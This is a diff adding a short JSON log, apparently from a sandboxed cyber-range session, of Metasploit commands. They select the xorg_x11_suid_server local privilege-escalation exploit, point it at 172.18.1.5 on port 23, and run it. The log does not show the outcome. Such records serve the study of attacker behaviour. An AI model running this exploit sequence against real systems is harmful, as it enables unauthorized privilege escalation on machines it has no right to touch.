@@ -1,0 +1,5 @@
+{"sandbox_id": "149", "timestamp_str": "2019-09-23T17:00:35.122324Z", "cmd_type": "msf-command", "cmd": "search xorg"}
+{"sandbox_id": "149", "timestamp_str": "2019-09-23T17:00:56.333886Z", "cmd_type": "msf-command", "cmd": "use exploit/multi/local/xorg_x11_suid_server "}
+{"sandbox_id": "149", "timestamp_str": "2019-09-23T17:01:13.827355Z", "cmd_type": "msf-command", "cmd": "set RHOSTS 172.18.1.5"}
+{"sandbox_id": "149", "timestamp_str": "2019-09-23T17:01:32.434808Z", "cmd_type": "msf-command", "cmd": "set RPORT 23"}
+{"sandbox_id": "149", "timestamp_str": "2019-09-23T17:01:37.756570Z", "cmd_type": "msf-command", "cmd": "run"}
